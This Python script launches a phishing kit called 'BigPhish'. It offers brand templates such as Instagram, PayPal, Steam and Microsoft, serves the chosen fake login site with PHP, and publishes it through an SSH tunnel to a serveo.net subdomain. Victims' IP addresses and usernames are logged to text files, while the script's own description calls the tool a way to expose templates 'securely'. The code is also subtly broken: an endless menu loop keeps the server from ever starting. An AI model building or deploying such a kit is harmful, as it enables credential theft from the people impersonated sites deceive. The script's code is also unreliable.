import argparse
import subprocess
import sys
import time
import random
import string

class colors:
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    RED = '\033[31m'
    BOLD = '\033[1m'
    END = '\033[0m'

def display_title():
    title = """

# @@@@@@@@@@@@@S@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# @'########::'####::'######::::'########::'##::::'##:'####::'######::'##::::'##:@
# @ ##.... ##:. ##::'##... ##::::##.... ##: ##:::: ##:. ##::'##... ##: ##:::: ##:@
# @ ##:::: ##:: ##:: ##:::..:::::##:::: ##: ##:::: ##:: ##:: ##:::..:: ##:::: ##:@
# @ ########::: ##:: ##::'####:::########:: #########:: ##::. ######:: #########:@
# @ ##.... ##:: ##:: ##::: ##::::##.....::: ##.... ##:: ##:::..... ##: ##.... ##:@
# @ ##:::: ##:: ##:: ##::: ##::::##:::::::: ##:::: ##:: ##::'##::: ##: ##:::: ##:@
# @ ########::'####:. ######:::::##:::::::: ##:::: ##:'####:. ######:: ##:::: ##:@
# @........:::....:::......:::::..:::::::::..:::::..::....:::......:::..:::::..::@
# @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


    """
    print(colors.BOLD + colors.GREEN + title + colors.END)

def display_menu():
    templates = [
        "Instagram", "Facebook", "Snapchat", "Twitter", "GitHub", "Google", 
        "Spotify", "Netflix", "PayPal", "Origin", "Steam", "Yahoo!", 
        "LinkedIn", "Protonmail", "Wordpress", "Microsoft", "IGFollowers", 
        "eBay", "Pinterest", "CryptoCurrency", "Verizon", "DropBox", 
        "Adobe ID", "Shopify", "FB Messenger", "GitLab", "Twitch", 
        "MySpace", "Badoo", "VK", "Yandex", "devianART", "Custom"
    ]
    while True:
        for template in templates:
            print(f"\r{colors.BOLD}{template}{colors.END} ", end="", flush=True)
            time.sleep(0.5)
            sys.stdout.write("\033[K")  # Clear the line
            time.sleep(0.1)

def start_server(choice, subdom):
    print(colors.GREEN + "Loading Template..." + colors.END)
    print(colors.BOLD + "Enter A Custom Subdomain (press Enter for random):" + colors.END)
    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
    if not subdom:
        subdom = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        print(colors.GREEN + f"Starting Server at {subdom}.serveo.net..." + colors.END)
    else:
        print(colors.GREEN + f"Starting Server at {subdom}.serveo.net..." + colors.END)
    print(colors.BOLD + f"Logs Can Be Found In sites/{choice}/ip.txt and sites/{choice}/usernames.txt" + colors.END)
    cmd_line = f"php -t sites/{choice} -S 127.0.0.1:80 & ssh -R {subdom}.serveo.net:80:127.0.0.1:80 serveo.net"
    p = subprocess.Popen(cmd_line, shell=True)

def main():
    parser = argparse.ArgumentParser(description="BigPhish: Expose local templates to the internet securely")
    parser.add_argument("template", help="Choose a template number to host", type=int, choices=range(1, 34))
    parser.add_argument("--subdomain", help="Specify a custom subdomain for the template", type=str)
    args = parser.parse_args()

    try:
        display_title()

        display_menu()

        start_server(args.template, args.subdomain)
        print(colors.GREEN + "Server started successfully. Press Ctrl+C to exit." + colors.END)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
    except Exception as e:
        print(colors.RED + "An error occurred:", e, colors.END)
        sys.exit(1)

if __name__ == "__main__":
    main()

